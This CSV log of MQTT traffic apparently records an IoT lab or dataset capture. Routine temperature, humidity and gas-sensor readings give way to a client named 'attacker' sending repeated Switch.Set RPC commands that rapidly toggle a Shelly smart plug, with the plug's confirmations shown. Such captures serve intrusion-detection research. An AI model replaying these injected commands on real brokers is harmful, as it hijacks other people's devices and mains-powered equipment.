timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:35:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:35:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:35:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:35:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:35:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:35:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:35:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:35:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:30,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:30,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:35,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:35,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:40,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:40,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:36:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:36:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:36:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:36:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:36:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:36:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:36:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:37:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:37:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:37:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4905 34375.417 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4906 34375.916 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34375.91,""swi"
2026-04-22T16:37:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4907 34375.934 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4908 34376.416 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34376.41,""swi"
2026-04-22T16:37:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4909 34376.433 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4910 34376.919 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34376.92,""swi"
2026-04-22T16:37:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4911 34376.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4912 34377.416 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34377.41,""swi"
2026-04-22T16:37:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4913 34377.432 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4914 34377.917 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34377.91,""swi"
2026-04-22T16:37:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4915 34377.936 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4916 34378.417 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34378.41,""swi"
2026-04-22T16:37:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4917 34378.434 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4918 34378.918 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:26,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:26,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34378.91,""swi"
2026-04-22T16:37:26,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4919 34378.937 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:26,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:26,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:26,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4920 34379.418 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:26,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:26,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34379.42,""swi"
2026-04-22T16:37:26,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4921 34379.435 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:27,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:27,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4922 34379.920 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:27,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:27,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34379.92,""swi"
2026-04-22T16:37:27,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4923 34379.938 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:27,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:27,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:27,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4924 34380.421 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:27,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:27,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34380.42,""swi"
2026-04-22T16:37:27,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4925 34380.437 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:28,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:28,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:28,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4926 34380.921 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:28,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:28,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34380.92,""swi"
2026-04-22T16:37:28,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4927 34380.939 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
